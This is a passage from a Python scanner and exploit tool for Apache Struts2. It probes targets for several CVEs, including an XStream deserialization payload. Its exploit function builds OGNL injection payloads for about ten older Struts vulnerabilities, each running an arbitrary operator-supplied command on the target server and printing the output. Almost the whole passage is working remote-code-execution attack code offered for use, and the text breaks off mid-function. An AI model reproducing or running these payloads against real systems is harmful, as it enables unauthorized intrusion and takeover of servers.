                                                       <next class="string">foo</next>
                                                     </serviceIterator>
                                                     <lock/>
                                                   </cipher>
                                                   <input class="java.lang.ProcessBuilder$NullInputStream"/>
                                                   <ibuffer/>
                                                   <done>false</done>
                                                   <ostart>0</ostart>
                                                   <ofinish>0</ofinish>
                                                   <closed>false</closed>
                                                 </is>
                                                 <consumed>false</consumed>
                                               </dataSource>
                                               <transferFlavors/>
                                             </dataHandler>
                                             <dataLen>0</dataLen>
                                           </value>
                                         </jdk.nashorn.internal.objects.NativeString>
                                         <jdk.nashorn.internal.objects.NativeString reference="../jdk.nashorn.internal.objects.NativeString"/>
                                       </entry>
                                       <entry>
                                         <jdk.nashorn.internal.objects.NativeString reference="../../entry/jdk.nashorn.internal.objects.NativeString"/>
                                         <jdk.nashorn.internal.objects.NativeString reference="../../entry/jdk.nashorn.internal.objects.NativeString"/>
                                       </entry>
                                     </map>'''
        cve_2017_9805_header = {"User-Agent" : "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:108.0) Gecko/20100101 Firefox/108.0" ,
                                "Accept" : "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8" ,
                                "Accept-Language" : "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2" ,
                                "Accept-Encoding" : "gzip, deflate" ,
                                "Content-Type" : "application/xml" ,
                                "Upgrade-Insecure-Requests" : "1"}
        cve_2017_9805_req = requests.post(url , headers=cve_2017_9805_header , data=cve_2017_9805_data , verify=False, timeout=timeout)
        # print(cve_2017_9805_req.text)
        etree_res = etree.HTML(cve_2017_9805_req.text)
        cve_2017_9805_result = etree_res.xpath('/html/body/h1/text()')
        # print(cve_2017_9791_pay_result)
        cve_2017_9805_str_result = "".join(cve_2017_9805_result)
        # print(cve_2017_9805_str_result)
        # print(cve_2017_9805_req.status_code)
        if cve_2017_9805_req.status_code == 500 and "HTTP Status 500 – Internal Server Error" in cve_2017_9805_str_result :
            cve = "CVE-2017=9805"
            scan.append(cve)

        time.sleep(2)

        """
        CVE-2017-12611  s2-053
        """
        if urls_specification["filename"] == "":
            url = urls_specification["site"] + urls_specification["file_path"] + "hello.action"
        cve_2017_12611_header = {"User-Agent" : "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:108.0) Gecko/20100101 Firefox/108.0" ,
                                 "Accept" : "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8" ,
                                 "Accept-Language" : "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2" ,
                                 "Accept-Encoding" : "gzip, deflate" ,
                                 "Content-Type" : "application/x-www-form-urlencoded" ,
                                 "Upgrade-Insecure-Requests" : "1"}
        cve_2017_12611_data = {"redirectUri" : "%{(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='echo 12345').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(@org.apache.commons.io.IOUtils@toString(#process.getInputStream()))}\n"}
        cve_2017_12611_req = requests.post(url , headers=cve_2017_12611_header , data=cve_2017_12611_data , verify=False, timeout=timeout)
        # print(cve_2017_12611_req.text)
        etree_res = etree.HTML(cve_2017_12611_req.text)
        cve_2017_12611_result = etree_res.xpath('/html/body/p/text()')
        cve_2017_12611_str_result = "".join(cve_2017_12611_result)
        # print(cve_2017_12611_str_result)
        if "12345" in cve_2017_12611_str_result :
            cve = "CVE-2017-12611"
            scan.append(cve)

        time.sleep(2)


        """
        CVE-2018-11776  s2-057
        """
        if urls_specification["file_path"] == "":
            # url = urls_specification["site"] + urls_specification["file_path"] + "hello.action"
            urls_specification["file_path"] = "/struts2-showcase/"
        if urls_specification["filename"] == "":
            # url = urls_specification["site"] + urls_specification["file_path"] + "hello.action"
            urls_specification["filename"] = "/actionChain1.action"
        cve_2018_11776_url = urls_specification["site"] + urls_specification["file_path"] + "${(123+123)}" + urls_specification["filename"]
        # print(cve_2018_11776_url)
        cve_2018_11776_req = requests.get(cve_2018_11776_url , headers=headers , verify=False, timeout=timeout , allow_redirects=False)
        # print(cve_2018_11776_req.headers)
        # print(cve_2018_11776_req.headers.get("Location"))
        if "Location" in cve_2018_11776_req.headers :
            if "246" in cve_2018_11776_req.headers.get("Location") :
                cve = "CVE-2018-11776"
                scan.append(cve)
        time.sleep(2)


        """
        CVE-2019-0230  s2-059
        """
        cve_2019_0230_url = urls_specification["site"] + urls_specification["file_dir"] + "?id=%25{2*2}"
        # print(cve_2019_0230_url)
        cve_2019_0230_req = requests.get(cve_2019_0230_url,headers=headers , verify=False, timeout=timeout)
        # print(cve_2019_0230_req.text)
        if "%{2*2}" in cve_2019_0230_req.text :
            cve = "CVE-2019-0230"
            scan.append(cve)

        time.sleep(2)

        """
        CVE-2020-17530  s2-061
        """
        cve_2020_17530_url = urls_specification["site"] + urls_specification["file_dir"] + "?id=%25%7b+%27test%27+%2b+(2000+%2b+20).toString()%7d"
        # print(cve_2020_17530_url)
        cve_2020_17530_req = requests.get(cve_2020_17530_url , headers=headers , verify=False, timeout=timeout)
        # print(cve_2020_17530_req.text)
        if "%{ 'test' + (2000 + 20).toString()}" in cve_2020_17530_req.text :
            cve = "CVE-2020-17530"
            scan.append(cve)

        time.sleep(2)








    except Exception as e:
        # print(e)
    # #     print("目标不可连接")
           a = "目标拒绝连接"
           scan.append(a)
    # #     pass
    str_scan = " ".join(scan)
    str_replace = str_scan.replace(' ', ' | ')
    print("[+] " + str_replace + " | ")
    # print(scan)
    # return({"scan":scan, "url":url, "req":reqt})
    return({"scan":scan, "url":url})

def exploit(url,vul,cmd) :
    scan_url = url_specification(url)
    scan_vul = scanvul(url)
    scans = scan_vul["scan"]
    urlc = url
    # print(scans)
    # scansu = scan_vul["url"]
    # print(scansu)
    # scant = scan_vul["req"]
    # print(scant)
    if vul in scans :
        if vul == "CVE-2007-4556" :
            if scan_url["filename"] == "":
                url = scan_url["site"] + scan_url["file_path"] + "/login.action"
            if cmd == "path" :
            #     payload = {"username": "", "password": "%{\"tomcatBinDir{\"+@java.lang.System@getProperty(\"user.dir\")+\"}\"}"}
            #     req = requests.post(url, headers=headers, data=payload, verify=False, timeout=timeout, allow_redirects=False)
            #     # print(req.status_code)
            #     # print(req.text)
            #     etree_res = etree.HTML(req.text)
            #     result = etree_res.xpath('//*[@id="login_password"]/@value')
            #     # print(result)
            #     path = ["tomcatpath:"]
            #     path.append(result)
            #     print(path)
            # elif cmd == "webpath" :
                payload = {"username": "",
                           "password": "%{#req=@org.apache.struts2.ServletActionContext@getRequest(),#response=#context.get(\"com.opensymphony.xwork2.dispatcher.HttpServletResponse\").getWriter(),#response.println(#req.getRealPath(\'/\')),#response.flush(),#response.close()}"}
                req = requests.post(url, headers=headers, data=payload, verify=False, timeout=timeout,allow_redirects=False)
                # print(req.status_code)
                # print(req.text)
                # print(req.html)
                reqtext = req.text
                ret = re.findall(r"\n/.*\n", reqtext)
                print(ret)
                # etree_res = etree.HTML(req.text)
                # result = etree_res.xpat;'h('//*[@id="login"]/p/text()')
                # # output = deque(req.text, 1)
                # # print(output)
                # path = ["webpath:"]
                # path.append(result)
                # print(path)
                # return req
            elif cmd != "" :
                cmds = cmd
                cm = shlex.split(cmds)
                cmd_str = '"' + '","'.join(cm) + '"'
                pwd = "%{#a=(new java.lang.ProcessBuilder(new java.lang.String[]{" + cmd_str + "})).redirectErrorStream(true).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#f=#context.get(\"com.opensymphony.xwork2.dispatcher.HttpServletResponse\"),#f.getWriter().println(new java.lang.String(#e)),#f.getWriter().flush(),#f.getWriter().close()}"
                # print(pwd)
                payload = {"username": "",
                           "password": pwd}
                req = requests.post(url, headers=headers, data=payload, verify=False, timeout=timeout,allow_redirects=False)
                # print(req.status_code)
                # print(req.text)
                reqtext = req.text
                # ret = re.findall(r"\S", reqtext)
                etree_res = etree.HTML(req.text)
                result = etree_res.xpath('//text()')
                list = result[-1]
                # reslist = json.loads(reqtext)
                # print(result)
                print(list)


            else :
                print("查看命令是否正确")

        if vul == "CVE-2010-1870" :
            if scan_url["filename"] == "":
                url = scan_url["site"] + scan_url["file_path"] + "/example/HelloWorld.action"
            if cmd == "path" :
                payload = "?%28%27%5C43_memberAccess.allowStaticMethodAccess%27%29%28a%29=true&%28b%29%28%28%27%5C43context[%5C%27xwork.MethodAccessor.denyMethodExecution%5C%27]%5C75false%27%29%28b%29%29&%28%27%5C43c%27%29%28%28%27%5C43_memberAccess.excludeProperties%5C75@java.util.Collections@EMPTY_SET%27%29%28c%29%29&%28g%29%28%28%27%5C43req%5C75@org.apache.struts2.ServletActionContext@getRequest%28%29%27%29%28d%29%29&%28i2%29%28%28%27%5C43xman%5C75@org.apache.struts2.ServletActionContext@getResponse%28%29%27%29%28d%29%29&%28i97%29%28%28%27%5C43xman.getWriter%28%29.println%28%5C43req.getRealPath%28%22%5Cu005c%22%29%29%27%29%28d%29%29&%28i99%29%28%28%27%5C43xman.getWriter%28%29.close%28%29%27%29%28d%29%29"
                capta_req = requests.get(url + payload, headers=headers, verify=False, timeout=timeout, stream=True)
                print(capta_req.raw.read(50).decode(encoding='utf-8'))
            elif cmd != "" :
                # cmds = cmd
                # cm = shlex.split(cmds)
                # cmd_str = "'" + "','".join(cm) + "'"
                payload = '''?%28%27%5Cu0023context[%5C%27xwork.MethodAccessor.denyMethodExecution%5C%27]%5Cu003dfalse%27%29%28bla%29%28bla%29&%28%27%5Cu0023_memberAccess.excludeProperties%5Cu003d@java.util.Collections@EMPTY_SET%27%29%28kxlzx%29%28kxlzx%29&%28%27%5Cu0023_memberAccess.allowStaticMethodAccess%5Cu003dtrue%27%29%28bla%29%28bla%29&%28%27%5Cu0023mycmd%5Cu003d%5C%27''' + urllib.parse.quote(
                (cmd),
                'utf-8') + '''%5C%27%27%29%28bla%29%28bla%29&%28%27%5Cu0023myret%5Cu003d@java.lang.Runtime@getRuntime%28%29.exec%28%5Cu0023mycmd%29%27%29%28bla%29%28bla%29&%28A%29%28%28%27%5Cu0023mydat%5Cu003dnew%5C40java.io.DataInputStream%28%5Cu0023myret.getInputStream%28%29%29%27%29%28bla%29%29&%28B%29%28%28%27%5Cu0023myres%5Cu003dnew%5C40byte[51020]%27%29%28bla%29%29&%28C%29%28%28%27%5Cu0023mydat.readFully%28%5Cu0023myres%29%27%29%28bla%29%29&%28D%29%28%28%27%5Cu0023mystr%5Cu003dnew%5C40java.lang.String%28%5Cu0023myres%29%27%29%28bla%29%29&%28%27%5Cu0023myout%5Cu003d@org.apache.struts2.ServletActionContext@getResponse%28%29%27%29%28bla%29%28bla%29&%28E%29%28%28%27%5Cu0023myout.getWriter%28%29.println%28%5Cu0023mystr%29%27%29%28bla%29%29'''
                capta_req = requests.get(url + payload, headers=headers, verify=False, timeout=timeout, stream=True)
                # print(capta_req.raw.read().decode(encoding='utf-8'))
                print(capta_req.raw.read(1500).decode(encoding='utf-8'))
            else :
                print("查看命令是否正确")

        if vul == "CVE-2011-3923" :
            if cmd == "path" :
                print("暂无可利用POC")
            elif cmd != "" :
                if "?" in url:
                    # print("aaa")
                    url_parameter = url.split("?")
                    url_parameter_one = url_parameter[0]
                    url_parameter_two = url_parameter[1]
                    if "&" in url_parameter_two:
                        url_parameter_A = url_parameter_two.split("&")
                        url_parameter_A_A = url_parameter_A[0]
                        url_parameter_A_A_s = url_parameter_A_A.split("=")
                        url_parameter_A_A_A = url_parameter_A_A_s[0]
                        url_parameter_A_A_B = url_parameter_A_A_s[1]

                        url_parameter_A_B = url_parameter_A[1]
                        # print(url_parameter_A_two)
                        url_parameter_A_B_s = url_parameter_A_B.split("=")
                        url_parameter_A_B_A = url_parameter_A_B_s[0]

                        cve_2011_3923 = '''?''' + url_parameter_A_A_A + '''=''' + url_parameter_A_A_B + '''&''' + url_parameter_A_B_A + '''=''' + '''(%23context[%22xwork.MethodAccessor.denyMethodExecution%22]=+new+java.lang.Boolean(false),+%23_memberAccess[%22allowStaticMethodAccess%22]=true,+%23a=@java.lang.Runtime@getRuntime().exec(%27''' + urllib.parse.quote(
                            (cmd),
                            'utf-8') + '''%27).getInputStream(),%23b=new+java.io.InputStreamReader(%23a),%23c=new+java.io.BufferedReader(%23b),%23d=new+char[51020],%23c.read(%23d),%23kxlzx=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),%23kxlzx.println(%23d),%23kxlzx.close())(meh)&z[(name)(%27meh%27)]'''

                        # print(payload)

                        capta_req = requests.get(url_parameter_one + cve_2011_3923, headers=headers, verify=False,
                                                 timeout=timeout,
                                                 stream=True)
                        print(capta_req.raw.read(1500).decode(encoding='utf-8'))

                    else:
                        cve_2011_3923 = '''&name=(%23context[%22xwork.MethodAccessor.denyMethodExecution%22]=+new+java.lang.Boolean(false),+%23_memberAccess[%22allowStaticMethodAccess%22]=true,+%23a=@java.lang.Runtime@getRuntime().exec(%27''' + urllib.parse.quote(
                            (cmd),
                            'utf-8') + '''%27).getInputStream(),%23b=new+java.io.InputStreamReader(%23a),%23c=new+java.io.BufferedReader(%23b),%23d=new+char[51020],%23c.read(%23d),%23kxlzx=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),%23kxlzx.println(%23d),%23kxlzx.close())(meh)&z[(name)(%27meh%27)]'''

                        capta_req = requests.get(url + cve_2011_3923, headers=headers, verify=False,timeout=timeout,stream=True)
                        print(capta_req.raw.read(1500).decode(encoding='utf-8'))

                else:

                    if scan_url["filename"] == "":
                        url = scan_url["site"] + scan_url["file_path"] + "/ajax/example5.action"

                    cve_2011_3923 = '''?age=12313&name=(%23context[%22xwork.MethodAccessor.denyMethodExecution%22]=+new+java.lang.Boolean(false),+%23_memberAccess[%22allowStaticMethodAccess%22]=true,+%23a=@java.lang.Runtime@getRuntime().exec(%27''' + urllib.parse.quote(
                        (cmd),
                        'utf-8') + '''%27).getInputStream(),%23b=new+java.io.InputStreamReader(%23a),%23c=new+java.io.BufferedReader(%23b),%23d=new+char[51020],%23c.read(%23d),%23kxlzx=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),%23kxlzx.println(%23d),%23kxlzx.close())(meh)&z[(name)(%27meh%27)]'''

                    capta_req = requests.get(url + cve_2011_3923, headers=headers, verify=False,
                                             timeout=timeout,
                                             stream=True)
                    print(capta_req.raw.read(1500).decode(encoding='utf-8'))

            else :
                print("查看命令是否正确")

        if vul == "CVE-2012-0392" :

            if scan_url["filename"] == "":
                url = scan_url["site"] + scan_url["file_path"] + "/devmode.action"

            if cmd == "path" :
                cve_2012_0392 = '''?debug=command&expression=(%23_memberAccess["allowStaticMethodAccess"]%3dtrue%2c%23foo%3dnew+java.lang.Boolean("false")+%2c%23context["xwork.MethodAccessor.denyMethodExecution"]%3d%23foo%2c%40org.apache.commons.io.IOUtils%40toString(%40java.lang.Runtime%40getRuntime().exec('pwd').getInputStream()))'''

                cve_2012_0392_req = requests.get(url + cve_2012_0392, headers=headers, verify=False, timeout=timeout, stream=True)

                print(cve_2012_0392_req.text)

            elif cmd != "" :
                cve_2012_0392 = '''?debug=command&expression=(%23_memberAccess["allowStaticMethodAccess"]%3dtrue%2c%23foo%3dnew+java.lang.Boolean("false")+%2c%23context["xwork.MethodAccessor.denyMethodExecution"]%3d%23foo%2c%40org.apache.commons.io.IOUtils%40toString(%40java.lang.Runtime%40getRuntime().exec(%27''' + urllib.parse.quote(
                        (cmd),
                        'utf-8') +'''%27).getInputStream()))'''

                cve_2012_0392_req = requests.get(url + cve_2012_0392, headers=headers, verify=False, timeout=timeout, stream=True)

                print(cve_2012_0392_req.text)

            else :
                print("查看命令是否正确")

        if vul == "CVE-2012-0838" :
            if scan_url["filename"] == "":
                url = scan_url["site"] + scan_url["file_path"] + "user.action"

            if cmd == "path" :

                cve_2012_0838 = '\' + (#_memberAccess["allowStaticMethodAccess"]=true,#foo=new java.lang.Boolean("false") ,#context["xwork.MethodAccessor.denyMethodExecution"]=#foo,@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(\'pwd\').getInputStream())) + \''

                poc = {"name": "",
                       "email": "",
                       "age": cve_2012_0838 }

                cve_2012_0838_req = requests.post(url, headers=headers, data=poc, verify=False, timeout=timeout, allow_redirects=False)

                # print(url)

                cve_2012_0838_text = cve_2012_0838_req.text
                # print(cve_2012_0838_text)
                etree_res = etree.HTML(cve_2012_0838_text)
                # result = etree_res.xpath('//*/@value')
                result = etree_res.xpath('//*[@id="user_age"]/@value[1]')
                # print(result)
                str_result = "".join(result)
                print(str_result)
                # html = BeautifulSoup(cve_2012_0838_text, 'html.parser')
                # over = html['value']
                # print(over)
            elif cmd != "" :
                cve_2012_0838 = '''\' + (#_memberAccess["allowStaticMethodAccess"]=true,#foo=new java.lang.Boolean("false") ,#context["xwork.MethodAccessor.denyMethodExecution"]=#foo,@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(\'''' + urllib.parse.quote((cmd),'utf-8') +'''\').getInputStream())) + \''''

                poc = {"name": "",
                       "email": "",
                       "age": cve_2012_0838}

                cve_2012_0838_req = requests.post(url, headers=headers, data=poc, verify=False, timeout=timeout,
                                                  allow_redirects=False)

                # print(url)

                cve_2012_0838_text = cve_2012_0838_req.text
                # print(cve_2012_0838_text)
                etree_res = etree.HTML(cve_2012_0838_text)
                # result = etree_res.xpath('//*/@value')
                result = etree_res.xpath('//*[@id="user_age"]/@value[1]')
                # print(result)
                str_result = "".join(result)
                print(str_result)
            else :
                print("查看命令是否正确")

        if vul == "CVE-2013-1965" :
            if scan_url["filename"] == "":
                url = scan_url["site"] + scan_url["file_path"] + "user.action"

            header = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:107.0) Gecko/20100101 Firefox/107.0",
                      "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
                      "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
                      "Content-Type": "application/x-www-form-urlencoded",
                      "Accept-Encoding": "gzip, deflate",
                      "Connection": "close"
                      }

            if cmd == "path" :
                cve_2013_1965_pay = '%{#a=(new java.lang.ProcessBuilder(new java.lang.String[]{"pwd"})).redirectErrorStream(true).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#f=#context.get("com.opensymphony.xwork2.dispatcher.HttpServletResponse"),#f.getWriter().println(new java.lang.String(#e)),#f.getWriter().flush(),#f.getWriter().close()}'

                cve_2013_1965_payload = {"name": cve_2013_1965_pay}

                cve_2013_1965_req = requests.post(url, headers=header, data=cve_2013_1965_payload, verify=False,timeout=timeout)
                print(cve_2013_1965_req.text)

            elif cmd != "" :
                cmds = cmd
                cm = shlex.split(cmds)
                cmd_str = '"' + '","'.join(cm) + '"'
                # print(cmd_str)
                cve_2013_1965_pay = '%{#a=(new java.lang.ProcessBuilder(new java.lang.String[]{' + cmd_str + '})).redirectErrorStream(true).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#f=#context.get("com.opensymphony.xwork2.dispatcher.HttpServletResponse"),#f.getWriter().println(new java.lang.String(#e)),#f.getWriter().flush(),#f.getWriter().close()}'

                cve_2013_1965_payload = {"name": cve_2013_1965_pay}

                cve_2013_1965_req = requests.post(url, headers=header, data=cve_2013_1965_payload, verify=False, timeout=timeout)
                if "<html>" in cve_2013_1965_req.text :
                    print("命令未能成功执行")
                else :
                    print(cve_2013_1965_req.text)


            else :
                print("查看命令是否正确")


        if vul == "CVE-2013-1966" :
            if cmd == "path" :
                if "?" in urlc:
                    url_parameter = urlc.split("?")
                    url_parameter_one = url_parameter[0]
                    url_parameter_two = url_parameter[1]
                    url_parameter_tree = url_parameter_two.split("=")
                    url_parameter_four = url_parameter_tree[0]

                    url = url_parameter_one + '''?''' + url_parameter_four + '''='''
                    # print(url)

                    cve_2013_1965 = '''%24%7B%23_memberAccess%5B%22allowStaticMethodAccess%22%5D%3Dtrue%2C%23a%3D%40java.lang.Runtime%40getRuntime().exec(%27''' + urllib.parse.quote(
                        ('pwd'),
                        'utf-8') + '''%27).getInputStream()%2C%23b%3Dnew%20java.io.InputStreamReader(%23a)%2C%23c%3Dnew%20java.io.BufferedReader(%23b)%2C%23d%3Dnew%20char%5B50000%5D%2C%23c.read(%23d)%2C%23out%3D%40org.apache.struts2.ServletActionContext%40getResponse().getWriter()%2C%23out.println('cloudscannertest%3D'%2Bnew%20java.lang.String(%23d))%2C%23out.close()%7D'''

                    capta_req = requests.get(url + cve_2013_1965, headers=headers, verify=False, timeout=timeout,
                                             stream=True)

                    # print(capta_req.text)
                    capta_req_split = capta_req.text.split("=")
                    capta_req_split_one = capta_req_split[1]
                    print(capta_req_split_one)

                else :
                    if scan_url["filename"] == "":
                        url = scan_url["site"] + scan_url["file_path"] + "link.action"

                    url = url + "?a="

                    cve_2013_1965 = '''%24%7B%23_memberAccess%5B%22allowStaticMethodAccess%22%5D%3Dtrue%2C%23a%3D%40java.lang.Runtime%40getRuntime().exec(%27''' + urllib.parse.quote(
                        ('pwd'),
                        'utf-8') + '''%27).getInputStream()%2C%23b%3Dnew%20java.io.InputStreamReader(%23a)%2C%23c%3Dnew%20java.io.BufferedReader(%23b)%2C%23d%3Dnew%20char%5B50000%5D%2C%23c.read(%23d)%2C%23out%3D%40org.apache.struts2.ServletActionContext%40getResponse().getWriter()%2C%23out.println('cloudscannertest%3D'%2Bnew%20java.lang.String(%23d))%2C%23out.close()%7D'''

                    capta_req = requests.get(url + cve_2013_1965, headers=headers, verify=False, timeout=timeout,
                                             stream=True)

                    # print(capta_req.text)
                    capta_req_split = capta_req.text.split("=")
                    capta_req_split_one = capta_req_split[1]
                    print(capta_req_split_one)
            elif cmd != "" :
                if "?" in urlc:
                    url_parameter = urlc.split("?")
                    url_parameter_one = url_parameter[0]
                    url_parameter_two = url_parameter[1]
                    url_parameter_tree = url_parameter_two.split("=")
                    url_parameter_four = url_parameter_tree[0]

                    url = url_parameter_one + '''?''' + url_parameter_four + '''='''
                    # print(url)

                    cve_2013_1965 = '''%24%7B%23_memberAccess%5B%22allowStaticMethodAccess%22%5D%3Dtrue%2C%23a%3D%40java.lang.Runtime%40getRuntime().exec(%27''' + urllib.parse.quote(
                        (cmd),
                        'utf-8') + '''%27).getInputStream()%2C%23b%3Dnew%20java.io.InputStreamReader(%23a)%2C%23c%3Dnew%20java.io.BufferedReader(%23b)%2C%23d%3Dnew%20char%5B50000%5D%2C%23c.read(%23d)%2C%23out%3D%40org.apache.struts2.ServletActionContext%40getResponse().getWriter()%2C%23out.println('cloudscannertest%3D'%2Bnew%20java.lang.String(%23d))%2C%23out.close()%7D'''

                    capta_req = requests.get(url + cve_2013_1965, headers=headers, verify=False, timeout=timeout,
                                             stream=True)

                    # print(capta_req.text)
                    capta_req_split = capta_req.text.split("=")
                    capta_req_split_one = capta_req_split[1]
                    print(capta_req_split_one)

                else :
                    if scan_url["filename"] == "":
                        url = scan_url["site"] + scan_url["file_path"] + "link.action"

                    url = url + "?a="

                    cve_2013_1965 = '''%24%7B%23_memberAccess%5B%22allowStaticMethodAccess%22%5D%3Dtrue%2C%23a%3D%40java.lang.Runtime%40getRuntime().exec(%27''' + urllib.parse.quote(
                        (cmd),
                        'utf-8') + '''%27).getInputStream()%2C%23b%3Dnew%20java.io.InputStreamReader(%23a)%2C%23c%3Dnew%20java.io.BufferedReader(%23b)%2C%23d%3Dnew%20char%5B50000%5D%2C%23c.read(%23d)%2C%23out%3D%40org.apache.struts2.ServletActionContext%40getResponse().getWriter()%2C%23out.println('cloudscannertest%3D'%2Bnew%20java.lang.String(%23d))%2C%23out.close()%7D'''

                    capta_req = requests.get(url + cve_2013_1965, headers=headers, verify=False, timeout=timeout,
                                             stream=True)

                    # print(capta_req.text)
                    capta_req_split = capta_req.text.split("=")
                    capta_req_split_one = capta_req_split[1]
                    print(capta_req_split_one)
            else :
                print("查看命令是否正确")


        if vul == "CVE-2013-2135" :
            url_site = scan_url["site"]
            if cmd == "path" :

                cve_2013_2135_pay = "${#context['xwork.MethodAccessor.denyMethodExecution']=false,#m=#_memberAccess.getClass().getDeclaredField('allowStaticMethodAccess'),#m.setAccessible(true),#m.set(#_memberAccess,true),#q=@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec('pwd').getInputStream()),#q}"
                cve_2013_2135_pay_end = urllib.parse.quote(cve_2013_2135_pay, 'utf-8')

                cve_2013_2135_pay_abc = "/" + cve_2013_2135_pay_end + ".action"
                cve_2013_2135_req = requests.get(url_site + cve_2013_2135_pay_abc, headers=headers, verify=False, timeout=timeout, stream=True)
                # print(cve_2013_2135_req.text)
                etree_res = etree.HTML(cve_2013_2135_req.text)
                # result = etree_res.xpath('//*/@value')
                result = etree_res.xpath('/html/body/p[2]/text()')
                # print(result)
                str_result = "".join(result)
                # print(str_result)
                re_result = re.sub(r"%0A.jsp" , "" ,str_result)
                print(re_result)

            elif cmd != "" :
                cve_2013_2135_pay = "${#context['xwork.MethodAccessor.denyMethodExecution']=false,#m=#_memberAccess.getClass().getDeclaredField('allowStaticMethodAccess'),#m.setAccessible(true),#m.set(#_memberAccess,true),#q=@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec('" + cmd +"').getInputStream()),#q}"
                cve_2013_2135_pay_end = urllib.parse.quote(cve_2013_2135_pay, 'utf-8')

                cve_2013_2135_pay_abc = "/" + cve_2013_2135_pay_end + ".action"
                cve_2013_2135_req = requests.get(url_site + cve_2013_2135_pay_abc, headers=headers, verify=False,
                                                 timeout=timeout, stream=True)
                # print(cve_2013_2135_req.text)
                etree_res = etree.HTML(cve_2013_2135_req.text)
                # result = etree_res.xpath('//*/@value')
                result = etree_res.xpath('/html/body/p[2]/text()')
                # print(result)
                str_result = "".join(result)
                # print(str_result)
                re_result = re.sub(r"%0A.jsp" , "" ,str_result)
                re_a_result = re.sub(r"/" , "" ,re_result)
                print(re_a_result)
            else :
                print("查看命令是否正确")

        if vul == "CVE-2013-2251" :
            header = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:108.0) Gecko/20100101 Firefox/108.0",
                      "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
                      "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
                      "Accept-Encoding": "gzip, deflate",
                      "Connection": "close",
                      "Upgrade-Insecure-Requests": "1"}
            if scan_url["filename"] == "":
                url = scan_url["site"] + scan_url["file_path"] + "index.action"
            if cmd == "path" :
                cve_2013_2251_pay = "%24%7b%23%72%65%71%3d%23%63%6f%6e%74%65%78%74%2e%67%65%74%28%27%63%6f%27%2b%27%6d%2e%6f%70%65%6e%27%2b%27%73%79%6d%70%68%6f%6e%79%2e%78%77%6f%27%2b%27%72%6b%32%2e%64%69%73%70%27%2b%27%61%74%63%68%65%72%2e%48%74%74%70%53%65%72%27%2b%27%76%6c%65%74%52%65%71%27%2b%27%75%65%73%74%27%29%2c%23%72%65%73%70%3d%23%63%6f%6e%74%65%78%74%2e%67%65%74%28%27%63%6f%27%2b%27%6d%2e%6f%70%65%6e%27%2b%27%73%79%6d%70%68%6f%6e%79%2e%78%77%6f%27%2b%27%72%6b%32%2e%64%69%73%70%27%2b%27%61%74%63%68%65%72%2e%48%74%74%70%53%65%72%27%2b%27%76%6c%65%74%52%65%73%27%2b%27%70%6f%6e%73%65%27%29%2c%23%72%65%73%70%2e%73%65%74%43%68%61%72%61%63%74%65%72%45%6e%63%6f%64%69%6e%67%28%27%55%54%46%2d%38%27%29%2c%23%6f%74%3d%23%72%65%73%70%2e%67%65%74%57%72%69%74%65%72%20%28%29%2c%23%6f%74%2e%70%72%69%6e%74%28%23%72%65%71%2e%67%65%74%53%65%73%73%69%6f%6e%28%29%2e%67%65%74%53%65%72%76%6c%65%74%43%6f%6e%74%65%78%74%28%29%2e%67%65%74%52%65%61%6c%50%61%74%68%28%27%2f%27%29%29%2c%23%6f%74%2e%66%6c%75%73%68%28%29%2c%23%6f%74%2e%63%6c%6f%73%65%28%29%7d"
                cve_2013_2251_pay_abc = "?redirect:" + cve_2013_2251_pay
                cve_2013_2251_req = requests.get(url + cve_2013_2251_pay_abc, headers=header, verify=False,timeout=timeout, allow_redirects=False)
                print(cve_2013_2251_req.text)
            elif cmd != "" :
                cve_2013_2251_pay = "${#context['xwork.MethodAccessor.denyMethodExecution']=false,#f=#_memberAccess.getClass().getDeclaredField('allowStaticMethodAccess'),#f.setAccessible(true),#f.set(#_memberAccess,true),@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec('" + cmd + "').getInputStream())}"
                cve_2013_2251_pay_end = urllib.parse.quote(cve_2013_2251_pay, 'utf-8')
                # print(cve_2013_2251_pay_end)
